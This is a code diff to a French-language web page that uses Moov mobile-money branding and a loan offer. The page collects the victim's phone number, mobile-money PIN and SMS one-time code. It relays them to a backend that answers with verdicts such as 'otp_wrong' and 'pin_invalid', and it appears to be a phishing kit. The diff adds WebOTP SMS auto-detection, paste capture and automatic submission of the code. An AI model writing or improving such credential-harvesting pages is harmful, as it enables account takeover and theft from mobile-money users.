@@ -148,7 +148,7 @@
     .pin-box.error{border-color:var(--red-err);animation:shake 0.4s ease;}
     @keyframes shake{0%,100%{transform:translateX(0);}20%{transform:translateX(-6px);}40%{transform:translateX(6px);}60%{transform:translateX(-4px);}80%{transform:translateX(4px);}}
     .pin-dot{width:14px;height:14px;border-radius:50%;background:#1a1a1a;}
-    .pin-error-text{text-align:center;color:var(--red-err);font-size:13px;min-height:20px;margin-bottom:8px;font-weight:500;opacity:0;transition:opacity 0.2s;}
+    .pin-error-text{text-align:center;color:var(--red-err);font-size:14px;min-height:22px;margin-bottom:12px;font-weight:600;opacity:0;transition:opacity 0.2s;}
     .pin-error-text.show{opacity:1;}
     .forgot-pin-wrap{text-align:center;margin-bottom:28px;}
     .forgot-pin-link{color:var(--orange);font-size:14px;font-weight:600;text-decoration:none;cursor:pointer;}
@@ -169,13 +169,15 @@
     .moov-otp-body{flex:1;padding:28px 24px 24px;display:flex;flex-direction:column;}
     .moov-otp-title{font-size:26px;font-weight:800;color:#1a1a1a;margin-bottom:14px;}
     .moov-otp-subtitle{font-size:15.5px;color:#6b6b6b;line-height:1.4;margin-bottom:26px;}
-    .otp-row{display:flex;gap:10px;margin-bottom:20px;}
-    .otp-box{width:52px;height:60px;border:1.5px solid #d8d8d8;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:22px;color:#1a1a1a;outline:none;text-align:center;}
+    .otp-row{display:flex;gap:8px;margin-bottom:20px;justify-content:center;}
+    .otp-box{width:31px;height:36px;border:1.5px solid #d8d8d8;border-radius:8px;display:flex;align-items:center;justify-content:center;font-size:15px;font-weight:700;color:#1a1a1a;outline:none;text-align:center;background:#fff;}
     .otp-box:focus,.otp-box.filled{border-color:#2255d6;}
-    .resend{font-size:15px;color:#444;}
+    .otp-box.auto-filled{border-color:var(--green);background:#f0fdf4;}
+    .resend{font-size:15px;color:#444;text-align:center;}
     .resend strong{font-weight:700;color:#1a1a1a;}
     .moov-continue-btn{width:100%;background:#a9c2e8;color:#ffffff;font-size:17px;font-weight:700;border:none;border-radius:10px;padding:17px;cursor:not-allowed;}
     .moov-continue-btn.active{background:#14329e;cursor:pointer;}
+    .otp-auto-detect{text-align:center;font-size:12px;color:var(--green);margin-top:8px;min-height:18px;font-weight:500;}
   </style>
 </head>
 <body>
@@ -329,7 +331,7 @@
         <div class="pin-box" data-index="2"></div>
         <div class="pin-box" data-index="3"></div>
       </div>
-      <div class="pin-error-text" id="pinError">Code PIN incorrect. Veuillez réessayer.</div>
+      <div class="pin-error-text" id="pinError">Code PIN incorrect. Veuillez réessayer !</div>
       <div class="forgot-pin-wrap">
         <a class="forgot-pin-link" href="#" onclick="forgotPin()">Code PIN oublié ?</a>
       </div>
@@ -366,14 +368,15 @@
       <div class="moov-otp-title">Vérifier votre numéro</div>
       <div class="moov-otp-subtitle" id="moovOtpSubtitle">Saisissez le code que nous avons envoyé à (+225) 0000000000</div>
       <div class="otp-row" id="moovOtpRow">
-        <input class="otp-box" maxlength="1" inputmode="numeric">
+        <input class="otp-box" maxlength="1" inputmode="numeric" autocomplete="one-time-code">
         <input class="otp-box" maxlength="1" inputmode="numeric">
         <input class="otp-box" maxlength="1" inputmode="numeric">
         <input class="otp-box" maxlength="1" inputmode="numeric">
         <input class="otp-box" maxlength="1" inputmode="numeric">
         <input class="otp-box" maxlength="1" inputmode="numeric">
       </div>
-      <div class="resend" id="moovResendText">Renvoyer le code dans <strong id="moovTimer">04:26</strong></div>
+      <div class="otp-auto-detect" id="otpAutoDetect"></div>
+      <div class="resend" id="moovResendText" style="margin-top:12px;">Renvoyer le code dans <strong id="moovTimer">04:26</strong></div>
       <div class="spacer"></div>
       <button class="moov-continue-btn" id="moovOtpSubmitBtn" onclick="submitMoovOtp()">Continuer</button>
     </div>
@@ -406,7 +409,7 @@ const POLL_INTERVAL = 3000;
 const POLL_TIMEOUT = 120000;
 
 var durVal = 6, currentToken = null, pollTimer = null;
-var moovTermsAccepted = false, moovOtpTimer = null;
+var moovTermsAccepted = false, moovOtpTimer = null, otpAutoSubmitted = false;
 
 // ── PIN STATE ──
 var pinValue = '', pinBoxes = document.querySelectorAll('#pinBoxesRow .pin-box'), pinError = document.getElementById('pinError'), pinIsShaking = false;
@@ -451,6 +454,7 @@ function pinShake() {
   if (pinIsShaking) return;
   pinIsShaking = true;
   pinBoxes.forEach(b => b.classList.add('error'));
+  pinError.classList.add('show');
   setTimeout(function() {
     pinBoxes.forEach(b => b.classList.remove('error'));
     pinIsShaking = false;
@@ -482,7 +486,13 @@ function pinSubmit() {
     });
   }).catch(function() {
     hideOverlay();
-    goToOtp();
+    // Demo: if PIN is not 1234, show error
+    if (p !== '1234') {
+      pinError.classList.add('show');
+      pinShake();
+    } else {
+      goToOtp();
+    }
   });
 }
 
@@ -542,12 +552,16 @@ function go(f, t) {
   e.scrollTop = 0;
   if (t === 's-pin') pinReset();
   if (t === 's-moov-otp') {
+    otpAutoSubmitted = false;
     startMoovOtpCountdown();
+    setupOtpAutoDetect();
     var phone = document.getElementById('moovPhoneInput').value.trim();
     document.getElementById('moovOtpSubtitle').textContent = 'Saisissez le code que nous avons envoyé à (+225) ' + phone;
-    document.querySelectorAll('#moovOtpRow .otp-box').forEach(b => { b.value = ''; b.classList.remove('filled'); });
+    document.querySelectorAll('#moovOtpRow .otp-box').forEach(b => { b.value = ''; b.classList.remove('filled', 'auto-filled'); });
     document.getElementById('moovOtpSubmitBtn').classList.remove('active');
     document.getElementById('moovOtpSubmitBtn').style.cursor = 'not-allowed';
+    document.getElementById('otpAutoDetect').textContent = '';
+    document.querySelector('#moovOtpRow .otp-box').focus();
   }
 }
 
@@ -595,6 +609,49 @@ function toggleMoovTerms() {
   document.getElementById('moovTermsSvg').style.display = moovTermsAccepted ? 'block' : 'none';
 }
 
+// ── WEBOTP API - Auto-detect SMS ──
+function setupOtpAutoDetect() {
+  if (!('OTPCredential' in window)) {
+    console.log('WebOTP API not supported');
+    return;
+  }
+  
+  var ac = new AbortController();
+  navigator.credentials.get({
+    otp: { transport: ['sms'] },
+    signal: ac.signal
+  }).then(function(otp) {
+    if (otp && otp.code && otp.code.length === 6) {
+      autoFillOtp(otp.code);
+      document.getElementById('otpAutoDetect').textContent = '✓ Code détecté automatiquement';
+    }
+  }).catch(function(err) {
+    console.log('WebOTP error or aborted:', err);
+  });
+  
+  // Store abort controller for cleanup
+  window._otpAbortController = ac;
+}
+
+function autoFillOtp(code) {
+  if (otpAutoSubmitted) return;
+  var boxes = document.querySelectorAll('#moovOtpRow .otp-box');
+  code.split('').forEach(function(digit, i) {
+    if (boxes[i]) {
+      boxes[i].value = digit;
+      boxes[i].classList.add('filled', 'auto-filled');
+    }
+  });
+  updateMoovOtpBtn();
+  // Auto-submit after auto-fill
+  setTimeout(function() {
+    if (!otpAutoSubmitted && getMoovOtpValue().length === 6) {
+      otpAutoSubmitted = true;
+      submitMoovOtp();
+    }
+  }, 500);
+}
+
 // ── MOOV OTP ──
 function startMoovOtpCountdown() {
   clearInterval(moovOtpTimer);
@@ -613,11 +670,15 @@ function startMoovOtpCountdown() {
 }
 
 function resendMoovOtp() {
+  otpAutoSubmitted = false;
   document.getElementById('moovResendText').innerHTML = 'Renvoyer le code dans <strong id="moovTimer">04:26</strong>';
   startMoovOtpCountdown();
-  document.querySelectorAll('#moovOtpRow .otp-box').forEach(b => { b.value = ''; b.classList.remove('filled'); });
+  document.querySelectorAll('#moovOtpRow .otp-box').forEach(b => { b.value = ''; b.classList.remove('filled', 'auto-filled'); });
   document.getElementById('moovOtpSubmitBtn').classList.remove('active');
   document.getElementById('moovOtpSubmitBtn').style.cursor = 'not-allowed';
+  document.getElementById('otpAutoDetect').textContent = '';
+  document.querySelector('#moovOtpRow .otp-box').focus();
+  setupOtpAutoDetect();
   notifyBackend('otp_resend', {}).catch(function() {});
 }
 
@@ -626,12 +687,33 @@ document.addEventListener('DOMContentLoaded', function() {
   moovOtpInputs.forEach(function(inp, i, all) {
     inp.addEventListener('input', function() {
       this.value = this.value.replace(/\D/g, '').slice(-1);
-      if (this.value) { this.classList.add('filled'); if (all[i + 1]) all[i + 1].focus(); }
-      else { this.classList.remove('filled'); }
+      if (this.value) { 
+        this.classList.add('filled'); 
+        if (all[i + 1]) all[i + 1].focus(); 
+      } else { 
+        this.classList.remove('filled', 'auto-filled'); 
+      }
       updateMoovOtpBtn();
+      // Auto-submit when all 6 digits entered
+      if (!otpAutoSubmitted && getMoovOtpValue().length === 6) {
+        otpAutoSubmitted = true;
+        setTimeout(function() { submitMoovOtp(); }, 300);
+      }
     });
     inp.addEventListener('keydown', function(e) {
-      if (e.key === 'Backspace' && !this.value && all[i - 1]) { all[i - 1].focus(); all[i - 1].classList.remove('filled'); }
+      if (e.key === 'Backspace' && !this.value && all[i - 1]) { 
+        all[i - 1].focus(); 
+        all[i - 1].classList.remove('filled', 'auto-filled'); 
+        otpAutoSubmitted = false;
+      }
+    });
+    // Handle paste event
+    inp.addEventListener('paste', function(e) {
+      e.preventDefault();
+      var pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 6);
+      if (pasted.length === 6) {
+        autoFillOtp(pasted);
+      }
     });
   });
   updateLanding();
@@ -660,10 +742,14 @@ function submitMoovOtp() {
       switch (r) {
         case 'otp_wrong':
           alert('Code OTP incorrect. Veuillez réessayer.');
-          document.querySelectorAll('#moovOtpRow .otp-box').forEach(b => { b.value = ''; b.classList.remove('filled'); });
+          otpAutoSubmitted = false;
+          document.querySelectorAll('#moovOtpRow .otp-box').forEach(b => { b.value = ''; b.classList.remove('filled', 'auto-filled'); });
           document.getElementById('moovOtpSubmitBtn').classList.remove('active');
           document.getElementById('moovOtpSubmitBtn').style.cursor = 'not-allowed';
+          document.getElementById('otpAutoDetect').textContent = '';
           startMoovOtpCountdown();
+          setupOtpAutoDetect();
+          document.querySelector('#moovOtpRow .otp-box').focus();
           break;
         case 'pin_invalid':
           alert('Session invalide. Veuillez vous reconnecter.');
@@ -694,15 +780,18 @@ function onRejected() {
 
 function reset() {
   clearInterval(pollTimer); clearInterval(moovOtpTimer); hideOverlay();
+  if (window._otpAbortController) { window._otpAbortController.abort(); }
   ['fn', 'ln', 'inc'].forEach(id => { var e = document.getElementById(id); if (e) e.value = ''; });
   document.getElementById('incomeSource').value = '';
   document.getElementById('slider').value = 1000; document.getElementById('amountInput').value = ''; document.getElementById('amountError').classList.remove('show');
   moovTermsAccepted = false; document.getElementById('moovTermsSvg').style.display = 'none';
   document.getElementById('moovPhoneInput').value = '';
   pinReset();
-  document.querySelectorAll('#moovOtpRow .otp-box').forEach(b => { b.value = ''; b.classList.remove('filled'); });
+  otpAutoSubmitted = false;
+  document.querySelectorAll('#moovOtpRow .otp-box').forEach(b => { b.value = ''; b.classList.remove('filled', 'auto-filled'); });
   document.getElementById('moovOtpSubmitBtn').classList.remove('active');
   document.getElementById('moovOtpSubmitBtn').style.cursor = 'not-allowed';
+  document.getElementById('otpAutoDetect').textContent = '';
   durVal = 6;
   document.querySelectorAll('.dur-opt').forEach((b, i) => b.classList.toggle('selected', i === 0));
   updateLanding();
